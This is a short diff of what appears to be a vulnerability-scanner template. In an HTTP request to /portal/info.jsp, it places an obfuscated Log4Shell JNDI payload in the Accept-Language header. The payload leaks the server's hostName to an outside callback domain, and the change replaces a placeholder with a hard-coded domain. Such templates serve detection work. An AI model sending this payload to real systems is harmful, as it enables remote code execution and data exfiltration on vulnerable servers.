@@ -27,7 +27,7 @@ http:
       - |
         GET /portal/info.jsp HTTP/1.1
         Host: {{Hostname}}
-        Accept-Language: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}
+        Accept-Language: ${jndi:${lower:d}n${lower:s}://${env:hostName}.interactsh-url.com}
 
     matchers-condition: and
     matchers:
